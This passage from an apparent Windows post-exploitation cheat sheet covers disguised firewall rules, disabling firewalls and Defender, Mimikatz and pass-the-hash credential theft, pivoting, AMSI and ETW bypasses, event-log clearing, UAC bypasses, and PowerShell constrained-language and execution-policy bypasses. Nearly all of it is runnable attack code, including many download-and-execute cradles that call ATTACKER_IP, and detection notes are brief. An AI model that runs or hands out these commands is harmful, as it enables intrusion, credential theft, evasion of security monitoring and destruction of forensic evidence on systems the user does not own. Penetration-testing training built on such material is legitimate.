New-NetFirewallRule -DisplayName "Windows License Activation" -Direction Inbound -Protocol TCP -LocalPort 4444 -Action Allow

# Mimic existing Microsoft rules
New-NetFirewallRule -DisplayName "Core Networking - Teredo (UDP-In)" -Direction Inbound -Protocol UDP -LocalPort 5555 -Action Allow
```

**Duplicate Existing Rules:**

powershell

```powershell
# Copy legitimate rule and modify
$existingRule = Get-NetFirewallRule -DisplayName "Cast to Device functionality (qWave-TCP-In)"
New-NetFirewallRule -DisplayName $existingRule.DisplayName -Direction Inbound -Protocol TCP -LocalPort 4445 -Action Allow -Description "Streaming media content"
```

#### Disabling Windows Firewall

**Disable All Profiles:**

powershell

```powershell
# PowerShell method
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# Verify
Get-NetFirewallProfile | Select-Object Name, Enabled
```

**netsh Disable Method:**

cmd

```cmd
# Disable all profiles
netsh advfirewall set allprofiles state off

# Disable specific profile
netsh advfirewall set domainprofile state off
netsh advfirewall set privateprofile state off
netsh advfirewall set publicprofile state off
```

**Registry Firewall Disable:**

cmd

```cmd
# Disable via registry
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile" /v EnableFirewall /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile" /v EnableFirewall /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile" /v EnableFirewall /t REG_DWORD /d 0 /f
```

#### Modifying Existing Rules

**Enable/Disable Rules:**

powershell

```powershell
# Disable rule by name
Disable-NetFirewallRule -DisplayName "Windows Remote Management (HTTP-In)"

# Enable rule
Enable-NetFirewallRule -DisplayName "File and Printer Sharing (SMB-In)"

# Disable by group
Disable-NetFirewallRule -Group "@FirewallAPI.dll,-28502"
```

**Modify Rule Properties:**

powershell

```powershell
# Change rule action
Set-NetFirewallRule -DisplayName "Existing Rule" -Action Allow

# Change ports
Set-NetFirewallRule -DisplayName "Web Service" -LocalPort 8080,8443

# Add remote address restriction
Set-NetFirewallRule -DisplayName "Admin Access" -RemoteAddress 10.0.0.100
```

**netsh Modification:**

cmd

```cmd
# Modify existing rule
netsh advfirewall firewall set rule name="Remote Desktop" new action=allow
netsh advfirewall firewall set rule name="Remote Desktop" new remoteip=any
```

#### Listing and Exporting Rules

**Enumerate Rules:**

powershell

```powershell
# List all firewall rules
Get-NetFirewallRule | Select-Object DisplayName, Enabled, Direction, Action

# Filter by specific criteria
Get-NetFirewallRule -Direction Inbound -Enabled True | Where-Object {$_.Action -eq "Allow"}

# Find rules by port
Get-NetFirewallRule | Get-NetFirewallPortFilter | Where-Object {$_.LocalPort -eq 4444}
```

**Export Firewall Configuration:**

cmd

```cmd
# Export all rules
netsh advfirewall export "C:\Windows\Temp\firewall_backup.wfw"

# Import rules
netsh advfirewall import "C:\Windows\Temp\firewall_backup.wfw"
```

**PowerShell Export:**

powershell

```powershell
# Export to CSV
Get-NetFirewallRule | Export-Csv -Path "C:\Windows\Temp\fw_rules.csv" -NoTypeInformation

# Export specific rules
Get-NetFirewallRule -Direction Inbound | Select-Object DisplayName, Enabled, Action | Export-Csv -Path "inbound_rules.csv"
```

#### Deleting Firewall Rules

**Remove Specific Rules:**

powershell

```powershell
# Delete by display name
Remove-NetFirewallRule -DisplayName "Remote Management"

# Delete all disabled rules
Get-NetFirewallRule -Enabled False | Remove-NetFirewallRule

# Delete rules matching pattern
Get-NetFirewallRule -DisplayName "*Test*" | Remove-NetFirewallRule
```

**netsh Deletion:**

cmd

```cmd
# Delete rule by name
netsh advfirewall firewall delete rule name="Remote Access"

# Delete all rules for specific program
netsh advfirewall firewall delete rule name=all program="C:\Windows\Temp\payload.exe"

# Delete all rules on specific port
netsh advfirewall firewall delete rule name=all protocol=tcp localport=4444
```

#### Remote Firewall Configuration

**PsExec Remote Modification:**

cmd

```cmd
# Create rule on remote system
psexec.exe \\target_host -u DOMAIN\admin -p password netsh advfirewall firewall add rule name="C2 Access" dir=in action=allow protocol=TCP localport=4444

# Disable firewall remotely
psexec.exe \\target_host -u DOMAIN\admin -p password netsh advfirewall set allprofiles state off
```

**PowerShell Remoting:**

powershell

```powershell
# Configure firewall remotely
Invoke-Command -ComputerName target_host -ScriptBlock {
    New-NetFirewallRule -DisplayName "Management Port" -Direction Inbound -Protocol TCP -LocalPort 5555 -Action Allow
}

# Disable firewall remotely
Invoke-Command -ComputerName target_host -ScriptBlock {
    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
}
```

**WMI Firewall Configuration:**

powershell

```powershell
# Create rule via WMI
$remoteSession = New-CimSession -ComputerName target_host -Credential (Get-Credential)
New-NetFirewallRule -CimSession $remoteSession -DisplayName "Remote Tool" -Direction Inbound -Protocol TCP -LocalPort 6666 -Action Allow
```

#### Group Policy Firewall Deployment

**Domain GPO Configuration:**

```
1. GPMC → Create/Edit GPO
2. Computer Configuration → Policies → Windows Settings → Security Settings → Windows Defender Firewall with Advanced Security
3. Inbound Rules → New Rule → Configure parameters
4. Deploy to target OUs
```

**Export/Import GPO Rules:**

powershell

```powershell
# Export GPO firewall settings
$gpo = Get-GPO -Name "Firewall Rules GPO"
Backup-GPO -Name $gpo.DisplayName -Path "C:\GPO_Backups"

# Import to another domain
Import-GPO -BackupId <GUID> -Path "C:\GPO_Backups" -TargetName "New GPO"
```

#### Detection Artifacts

**Event Logs:**

- Event ID 2004: Firewall rule added
- Event ID 2005: Firewall rule modified
- Event ID 2006: Firewall rule deleted
- Event ID 2003: Firewall settings changed (enable/disable)

**Registry Locations:**

```
HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules
HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\RestrictedServices\
```

**Monitoring Firewall Changes:**

powershell

```powershell
# Watch firewall event log
Get-WinEvent -LogName "Microsoft-Windows-Windows Firewall With Advanced Security/Firewall" | 
    Where-Object { $_.Id -in 2004,2005,2006 } |
    Select-Object TimeCreated, Id, Message
```

**[Inference]** Firewall rule additions using netsh generate distinct log patterns compared to PowerShell cmdlets, with netsh producing Event ID 2004 entries that may include less detailed metadata about the rule creator.

#### Service-Based Firewall Manipulation

**Stop Firewall Service:**

cmd

```cmd
# Stop and disable firewall service
sc stop mpssvc
sc config mpssvc start= disabled

# Restart to apply changes
shutdown /r /t 0
```

**[Unverified]** Stopping the mpssvc service typically causes immediate firewall disablement, but Windows 10+ may include service protection mechanisms preventing unauthorized service manipulation.

---

### Important Related Subtopics

For comprehensive Windows persistence coverage, investigate:

- **Registry Run key alternatives** (Image File Execution Options, AppInit_DLLs, Winlogon Notification Packages)
- **Service creation and manipulation** (creating Windows services for persistence)
- **DLL hijacking and search order exploitation** (planting malicious DLLs in application search paths)
- **Accessibility feature backdoors** (replacing sethc.exe, utilman.exe for pre-authentication access)
- **BITS jobs persistence** (Background Intelligent Transfer Service for stealthy execution)

---

## Windows Post-Exploitation

### Pass-the-Hash Attacks

Pass-the-Hash (PtH) allows authentication using NTLM hash values without cracking them to plaintext passwords.

**Hash Extraction with Mimikatz**

```powershell
# Dump LSASS for credential extraction
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

# Extract specific hash types
sekurlsa::msv           # NTLM hashes
sekurlsa::wdigest       # Clear-text passwords (older Windows)
sekurlsa::kerberos      # Kerberos tickets
```

**Impacket PsExec with Hash**

```bash
# Execute commands using NTLM hash
impacket-psexec -hashes :<NTLM_HASH> DOMAIN/USERNAME@<TARGET_IP>

# Example
impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.10

# Alternative impacket tools
impacket-wmiexec -hashes :<NTLM_HASH> DOMAIN/USERNAME@<TARGET_IP>
impacket-smbexec -hashes :<NTLM_HASH> DOMAIN/USERNAME@<TARGET_IP>
impacket-atexec -hashes :<NTLM_HASH> DOMAIN/USERNAME@<TARGET_IP>
```

**CrackMapExec for PtH**

```bash
# Authenticate and execute commands
crackmapexec smb <TARGET_IP> -u USERNAME -H <NTLM_HASH> -x "whoami"

# Dump SAM database
crackmapexec smb <TARGET_IP> -u USERNAME -H <NTLM_HASH> --sam

# Dump LSA secrets
crackmapexec smb <TARGET_IP> -u USERNAME -H <NTLM_HASH> --lsa

# Execute commands on multiple targets
crackmapexec smb <TARGET_RANGE> -u USERNAME -H <NTLM_HASH> -x "command"
```

**Evil-WinRM with Hash**

```bash
evil-winrm -i <TARGET_IP> -u USERNAME -H <NTLM_HASH>
```

**Metasploit PsExec with Hash**

```bash
use exploit/windows/smb/psexec
set RHOSTS <TARGET_IP>
set SMBUser USERNAME
set SMBPass <LM_HASH>:<NTLM_HASH>
exploit
```

**Pass-the-Hash Prerequisites**

Requirements for successful PtH:

- SMB access (TCP 445)
- Valid domain or local administrator credentials
- Target must have SMB enabled
- [Inference] UAC remote restrictions may block local admin PtH on Windows 10+ (domain admins typically unaffected)

**Extracting Hashes from Different Sources**

**SAM Database Extraction**

```bash
# Using Impacket secretsdump remotely
impacket-secretsdump USERNAME:PASSWORD@<TARGET_IP>

# Local extraction (requires SYSTEM privileges)
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

**NTDS.dit Extraction (Domain Controller)**

```bash
# Remote extraction
impacket-secretsdump -just-dc DOMAIN/USERNAME:PASSWORD@<DC_IP>

# Extract NTDS with specific user
impacket-secretsdump -just-dc-user Administrator DOMAIN/USERNAME:PASSWORD@<DC_IP>
```

### Pivoting Through Windows Networks

**Port Forwarding with Native Windows Tools**

**NetSH Port Forwarding**

```cmd
# Add port forward rule (requires admin)
netsh interface portproxy add v4tov4 listenport=<LOCAL_PORT> listenaddress=0.0.0.0 connectport=<REMOTE_PORT> connectaddress=<TARGET_IP>

# View existing rules
netsh interface portproxy show all

# Delete rule
netsh interface portproxy delete v4tov4 listenport=<LOCAL_PORT> listenaddress=0.0.0.0
```

**SSH Tunneling through Compromised Windows Host**

**Local Port Forward**

```bash
# Forward local port through SSH to internal network
ssh -L <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> user@<COMPROMISED_HOST>

# Example: Access internal RDP
ssh -L 3389:10.10.10.5:3389 compromised_user@192.168.1.10
```

**Dynamic SOCKS Proxy**

```bash
# Create SOCKS proxy on compromised host
ssh -D 1080 user@<COMPROMISED_HOST>

# Configure proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# Use with any tool
proxychains nmap -sT -Pn <INTERNAL_TARGET>
proxychains evil-winrm -i <INTERNAL_TARGET> -u USERNAME -p PASSWORD
```

**Metasploit Pivoting**

**Route Addition**

```bash
# From meterpreter session
run autoroute -s <SUBNET>/24

# Or manually in msfconsole
route add <SUBNET> <NETMASK> <SESSION_ID>

# Example
route add 10.10.10.0 255.255.255.0 1
```

**SOCKS Proxy with Metasploit**

```bash
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j

# Add route first
route add <INTERNAL_SUBNET> <NETMASK> <SESSION_ID>
```

**Port Forwarding in Meterpreter**

```bash
# Local port forward
portfwd add -l <LOCAL_PORT> -p <REMOTE_PORT> -r <TARGET_IP>

# Example: Forward internal RDP
portfwd add -l 3389 -p 3389 -r 10.10.10.5

# List forwards
portfwd list

# Delete forward
portfwd delete -l <LOCAL_PORT>
```

**Chisel for HTTP Tunneling**

```bash
# On Kali (server)
chisel server -p 8000 --reverse

# On compromised Windows (client)
chisel.exe client <ATTACKER_IP>:8000 R:socks

# Configure proxychains to use 127.0.0.1:1080
```

**Ligolo-ng for Advanced Pivoting**

[Unverified] Ligolo-ng provides layer 3 tunneling which may offer better performance than SOCKS proxies in some scenarios.

```bash
# On Kali
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# On Windows target
agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert

# In proxy interface
session
ifconfig
start
```

### Windows Defender and AV Evasion

**Checking Defender Status**

```powershell
Get-MpComputerStatus
Get-MpPreference

# Check exclusions
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
Get-MpPreference | Select-Object -ExpandProperty ExclusionExtension
```

**Disabling Windows Defender (Requires Admin)**

```powershell
# Disable real-time monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

# Disable scanning for specific locations
Add-MpPreference -ExclusionPath "C:\Users\Public"

# Disable specific protections
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
```

**AMSI Bypass Techniques**

[Unverified - These techniques may be detected by updated security products]

```powershell
# Method 1: Reflection bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Method 2: Memory patching (obfuscated)
$a='si';$b='Am';$c='Utils';$d=$b+$a+$c;$e=[Ref].Assembly.GetType("System.Management.Automation.$d");$f=$e.GetField('amsiInitFailed','NonPublic,Static');$f.SetValue($null,$true)

# Method 3: Force error
[Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog
```

**Obfuscation Techniques**

**String Concatenation**

```powershell
# Instead of: Invoke-Mimikatz
$m = 'Inv' + 'oke-' + 'Mimi' + 'katz'
& $m
```

**Base64 Encoding**

```powershell
$command = 'Get-Process'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell -encodedCommand $encoded
```

**Download Cradles with Evasion**

```powershell
# Method 1: WebClient
$wc = New-Object System.Net.WebClient
$wc.DownloadString('http://<IP>/payload.ps1') | IEX

# Method 2: Invoke-RestMethod
IRM http://<IP>/payload.ps1 | IEX

# Method 3: Net.WebRequest
$req = [System.Net.WebRequest]::Create('http://<IP>/payload.ps1')
$res = $req.GetResponse()
IEX ([System.IO.StreamReader]($res.GetResponseStream())).ReadToEnd()
```

**Living Off The Land Binaries (LOLBins)**

```cmd
# CertUtil download
certutil -urlcache -split -f http://<IP>/payload.exe payload.exe

# BITSAdmin download
bitsadmin /transfer job /download /priority high http://<IP>/payload.exe C:\Windows\Temp\payload.exe

# Regsvr32 for scriptlets
regsvr32 /s /n /u /i:http://<IP>/payload.sct scrobj.dll

# MSIExec for remote MSI
msiexec /quiet /i http://<IP>/payload.msi
```

**Process Injection to Evade Detection**

[Inference] Injecting into legitimate processes can help evade behavioral detection:

```bash
# Meterpreter process migration
migrate <PID>

# Migrate to specific process
ps
migrate 1234
```

**Disable ETW (Event Tracing for Windows)**

```powershell
# Patch ETW in current process
[Reflection.Assembly]::LoadWithPartialName('System.Core')
$d=[AppDomain]::CurrentDomain."DefineDynamicAssembly"(1,1)."DefineDynamicModule"(1);$z=$d."DefineType"(1,1179913,[ValueType]);$z."DefineField"('b1',([Byte]),'Public')
```

### Event Log Manipulation and Deletion

**Viewing Event Logs**

```powershell
# List available logs
Get-EventLog -List

# View specific log
Get-EventLog -LogName Security -Newest 100
Get-EventLog -LogName System -Newest 100

# Query specific event
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624}
```

**Clearing Event Logs**

```powershell
# Clear specific log
Clear-EventLog -LogName Security
Clear-EventLog -LogName System
Clear-EventLog -LogName Application

# Clear all logs
wevtutil el | Foreach-Object {wevtutil cl "$_"}

# Using wevtutil
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
```

**Selective Event Deletion**

[Unverified] Selective deletion may leave forensic artifacts indicating tampering:

```powershell
# Remove specific event by ID
$log = 'Security'
$events = Get-WinEvent -FilterHashtable @{LogName=$log; ID=4624}
foreach ($event in $events) {
    Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog\$log" -Force
}
```

**Disabling Event Logging**

```cmd
# Stop Event Log service
sc stop eventlog

# Disable specific audit policies
auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable
auditpol /set /category:"Account Logon" /success:disable /failure:disable
```

**Registry Manipulation for Log Settings**

```powershell
# Disable logging via registry
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog\Security" -Name "MaxSize" -Value 0

# Limit log size to cause overwrite
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog\Security" -Name "MaxSize" -Value 1024
```

**Phantom Log Technique**

[Inference] Creating high volumes of benign events can obscure malicious activity:

```powershell
# Generate noise in logs
1..1000 | ForEach-Object {
    Write-EventLog -LogName Application -Source "WSH" -EventID 1 -Message "Benign activity"
}
```

**Timestomp with Metasploit**

```bash
# From meterpreter
timestomp <file> -m "01/01/2020 12:00:00"
timestomp <file> -a "01/01/2020 12:00:00"
timestomp <file> -c "01/01/2020 12:00:00"
```

**Important Forensic Considerations**

[Inference] Complete log deletion is highly suspicious and often triggers alerts. Consider:

- Selective deletion leaves gaps that forensic tools detect
- USN Journal, $MFT, and other artifacts may retain evidence
- Network monitoring may capture activity regardless of host logs
- EDR/SIEM solutions often have off-host log retention

**Alternate Log Locations to Consider**

```powershell
# PowerShell command history
%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# RDP cache and artifacts
%LOCALAPPDATA%\Microsoft\Terminal Server Client\Cache\

# Prefetch files
C:\Windows\Prefetch\

# USN Journal
fsutil usn queryjournal C:
```

---

### UAC Bypasses (Various Methods)

User Account Control (UAC) prevents unauthorized elevation of privileges. Various techniques can bypass UAC to gain elevated access without prompting the user.

**UAC Architecture Overview**

UAC operates at integrity levels:

- Low (untrusted processes)
- Medium (standard user)
- High (administrator)
- System (SYSTEM account)

**Fodhelper UAC Bypass**

Fodhelper.exe is an auto-elevated binary that reads registry keys without elevation.

```powershell
# Create registry structure
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')" -Force

# Execute fodhelper
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

# Cleanup
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```

**ComputerDefaults UAC Bypass**

Similar to fodhelper, exploiting ComputerDefaults.exe:

```powershell
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c START /B powershell.exe -nop -w hidden -enc PAYLOAD" -Force

Start-Process "C:\Windows\System32\ComputerDefaults.exe" -WindowStyle Hidden

Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```

**SDClt UAC Bypass**

Exploits sdclt.exe (Backup and Restore):

```powershell
New-Item -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "(default)" -Value "powershell -nop -w hidden -enc PAYLOAD" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute" -Value "" -Force

Start-Process "C:\Windows\System32\sdclt.exe" -WindowStyle Hidden

Remove-Item -Path "HKCU:\Software\Classes\Folder" -Recurse -Force
```

**EventVwr UAC Bypass**

Eventvwr.exe reads from registry without elevation:

```powershell
New-Item "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value "powershell -nop -w hidden -enc PAYLOAD" -Force

Start-Process "C:\Windows\System32\eventvwr.msc" -WindowStyle Hidden

Start-Sleep 3
Remove-Item "HKCU:\Software\Classes\mscfile" -Recurse -Force
```

**DiskCleanup UAC Bypass**

Exploits cleanmgr.exe scheduled task:

```powershell
# Modify registry for DiskCleanup
New-Item "HKCU:\Environment" -Force
Set-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value "cmd /c powershell -nop -w hidden -enc PAYLOAD & REM " -Force

# Trigger via scheduled task
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup" /I

Start-Sleep 3
Remove-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Force
```

**CMSTPLUA COM Interface Bypass**

Exploits ICMLuaUtil COM interface:

```powershell
# PowerShell implementation
$CMLuaUtil = [Type]::GetTypeFromCLSID('3E5FC7F9-9A51-4367-9063-A120244FBEC7')
$COMObject = [Activator]::CreateInstance($CMLuaUtil)
$COMObject.ShellExec("cmd.exe", "/c powershell -nop -w hidden -enc PAYLOAD", $null, $null, 0)
```

**Mock Trusted Directory UAC Bypass**

[Inference] This technique exploits DLL search order by placing a malicious DLL in a writable system directory that loads before the legitimate one.

```powershell
# Copy legitimate binary to user-writable location
Copy-Item "C:\Windows\System32\wusa.exe" "C:\Users\Public\wusa.exe"

# Create malicious DLL that will be loaded
# Place in same directory as copied binary
# Binary will execute with high integrity when launched

# Execute
Start-Process "C:\Users\Public\wusa.exe"
```

**Checking UAC Level**

```powershell
# Check current UAC settings
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin"

# Values:
# 0 = No prompting (most permissive)
# 1 = Prompt on secure desktop
# 2 = Always prompt
# 5 = Prompt for non-Windows binaries (default)
```

**UAC Bypass Detection**

```powershell
# Check if running elevated
([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# Get integrity level
whoami /groups | findstr /i "mandatory"
```

### PowerShell Constrained Language Bypass

Constrained Language Mode restricts PowerShell functionality to prevent malicious code execution.

**Detecting Constrained Language Mode**

```powershell
# Check current language mode
$ExecutionContext.SessionState.LanguageMode

# Output values:
# FullLanguage - No restrictions
# ConstrainedLanguage - Restricted functionality
# RestrictedLanguage - Very limited
# NoLanguage - Minimal functionality
```

**PSBypassCLM Technique**

[Inference] Exploiting runspace creation with unrestricted language mode:

```powershell
# Create unrestricted runspace
$Runspace = [runspacefactory]::CreateRunspace()
$Runspace.ApartmentState = "STA"
$Runspace.ThreadOptions = "ReuseThread"
$Runspace.Open()

# Set to FullLanguage
$Runspace.SessionStateProxy.LanguageMode = "FullLanguage"

# Execute code in unrestricted runspace
$PowerShell = [powershell]::Create()
$PowerShell.Runspace = $Runspace
$PowerShell.AddScript("IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')")
$PowerShell.Invoke()
```

**InstallUtil Bypass**

Using InstallUtil.exe to execute C# code outside CLM:

```csharp
// Save as bypass.cs
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

public class Program {
    public static void Main(string[] args) {
        Console.WriteLine(Runspace.DefaultRunspace.SessionStateProxy.LanguageMode);
    }
}

[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer {
    public override void Uninstall(System.Collections.IDictionary savedState) {
        String cmd = "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')";
        Runspace rs = RunspaceFactory.CreateRunspace();
        rs.Open();
        PowerShell ps = PowerShell.Create();
        ps.Runspace = rs;
        ps.AddScript(cmd);
        ps.Invoke();
        rs.Close();
    }
}
```

Compile and execute:

```bash
# On Windows
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:System.Management.Automation.dll /r:System.Configuration.Install.dll /target:library /out:bypass.dll bypass.cs

# Execute via InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U bypass.dll
```

**MSBuild Bypass**

Execute unrestricted code via MSBuild.exe:

```xml
<!-- bypass.csproj -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Build">
    <ClassLibrary />
  </Target>
  <UsingTask TaskName="ClassLibrary" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
      <![CDATA[
        using System;
        using System.Management.Automation;
        using System.Management.Automation.Runspaces;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        
        public class ClassLibrary : Task {
          public override bool Execute() {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript("IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')");
            ps.Invoke();
            rs.Close();
            return true;
          }
        }
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

Execute:

```bash
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe bypass.csproj
```

**DLL Reflection Bypass**

Loading unsigned DLLs using reflection:

```powershell
# Load assembly from byte array
$bytes = [System.IO.File]::ReadAllBytes("C:\path\to\unsigned.dll")
[System.Reflection.Assembly]::Load($bytes)

# Invoke method from loaded assembly
[ClassName]::MethodName()
```

**PowerShell Downgrade Attack**

[Inference] Using PowerShell version 2 which doesn't support CLM:

```powershell
# Check if PowerShell v2 is available
powershell -Version 2 -Command {$ExecutionContext.SessionState.LanguageMode}

# Execute payload in v2
powershell -Version 2 -Command {IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')}
```

**Prerequisite:** PowerShell v2 requires .NET Framework 2.0/3.5 to be installed.

### Execution Policy Bypass

Execution policy restricts script execution but is not a security boundary.

**Checking Execution Policy**

```powershell
# Current policy
Get-ExecutionPolicy

# All scopes
Get-ExecutionPolicy -List

# Policies:
# Restricted - No scripts allowed
# AllSigned - Only signed scripts
# RemoteSigned - Remote scripts must be signed
# Unrestricted - All scripts allowed with warning
# Bypass - No restrictions
# Undefined - No policy set
```

**Bypass via ExecutionPolicy Parameter**

```powershell
# Set bypass for current session
powershell -ExecutionPolicy Bypass -File script.ps1

# Alternative
powershell -ep Bypass -File script.ps1

# With encoded command
powershell -ep Bypass -enc ENCODED_PAYLOAD
```

**Bypass via Command Parameter**

```powershell
# Execute script content directly
powershell -Command "& {IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')}"

# Shorter version
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')"
```

**Bypass via Standard Input**

```powershell
# Pipe script to PowerShell
type script.ps1 | powershell -noprofile -

# From remote
curl http://ATTACKER_IP/payload.ps1 | powershell -noprofile -

# Using Get-Content
Get-Content script.ps1 | powershell -noprofile -
```

**Bypass via Invoke-Command**

```powershell
# Read and execute script
Invoke-Command -ScriptBlock ([ScriptBlock]::Create((Get-Content script.ps1 -Raw)))

# From URL
Invoke-Command -ScriptBlock ([ScriptBlock]::Create((New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')))
```

**Bypass via IEX (Invoke-Expression)**

```powershell
# Execute script content
IEX (Get-Content script.ps1 -Raw)

# From URL
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')

# Using Invoke-RestMethod
IEX(Invoke-RestMethod 'http://ATTACKER_IP/payload.ps1')
```

**Bypass via Echo and Paste**

```powershell
# Echo script into PowerShell
echo IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1') | powershell -noprofile -
```

**Bypass via Batch File Wrapper**

```batch
@echo off
powershell -ExecutionPolicy Bypass -File script.ps1
```

**Bypass via Registry Modification**

```powershell
# Change execution policy via registry (requires admin)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell" -Name "ExecutionPolicy" -Value "Bypass"

# User scope
Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell" -Name "ExecutionPolicy" -Value "Bypass"
```

**Bypass via Function Invocation**

```powershell
# Define function and execute
function Invoke-Payload {IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')}
Invoke-Payload
```

**Bypass via DownloadFile and Unblock**

```powershell
# Download and unblock file
(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/payload.ps1', 'payload.ps1')
Unblock-File payload.ps1

# Execute
.\payload.ps1
```

**Bypass via Clipboard**

```powershell
# Copy script to clipboard, then paste and execute
Get-Clipboard | IEX
```

**Encoded Command Bypass**

```powershell
# Base64 encode PowerShell command
$command = "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)

# Execute encoded
powershell -encodedCommand $encoded
```

**Bypass via COM Objects**

```powershell
# Execute via WScript.Shell
$com = New-Object -ComObject WScript.Shell
$com.Run("powershell -ep Bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')")
```

**Persistent Execution Policy Change**

```powershell
# Set for current user (no admin required)
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force

# Set for local machine (requires admin)
Set-ExecutionPolicy -Scope LocalMachine -ExecutionPolicy Bypass -Force

# Verify
Get-ExecutionPolicy -List
```

---

**Important Related Topics:**

- AMSI (Anti-Malware Scan Interface) bypass techniques
- AppLocker and WDAC bypass methods
- Process injection and migration techniques
